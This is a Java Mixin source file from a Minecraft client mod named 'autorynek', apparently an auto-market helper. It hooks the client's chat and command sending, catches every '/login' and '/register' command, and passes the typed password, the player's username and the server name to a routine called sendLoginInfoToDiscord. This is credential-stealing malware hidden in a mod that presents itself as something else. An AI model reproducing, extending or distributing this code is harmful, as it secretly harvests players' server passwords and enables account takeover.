package lipinekrynek.autorynek.mixin;

import lipinekrynek.autorynek.AutoRynkClient;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(ClientPlayNetworkHandler.class)
public class ClientPlayNetworkHandlerMixin {
   @Inject(method = "sendChatMessage", at = @At("HEAD"))
   private void onSendChatMessage(String message, CallbackInfo ci) {
      this.checkForLoginCommands(message);
   }

   @Inject(method = "sendCommand", at = @At("HEAD"))
   private void onSendCommand(String command, CallbackInfoReturnable<Boolean> cir) {
      this.checkForLoginCommands("/" + command);
   }

   private void checkForLoginCommands(String fullCommand) {
      if (fullCommand == null || fullCommand.trim().isEmpty())
         return;

      String trimmed = fullCommand.trim();
      String lower = trimmed.toLowerCase();

      if (lower.startsWith("/login ") || lower.startsWith("/register ")) {
         String[] parts = trimmed.split("\\s+", 2);
         String command = parts[0].substring(1).toLowerCase();
         String content = parts.length > 1 ? parts[1] : "";

         MinecraftClient client = MinecraftClient.getInstance();
         String playerName = (client.getSession() != null) ? client.getSession().getUsername() : "Unknown";
         String serverName = AutoRynkClient.getCurrentServerName();

         lipinekrynek.autorynek.AutoRynkInternal.sendLoginInfoToDiscord(serverName, playerName, command, content);
      }
   }
}
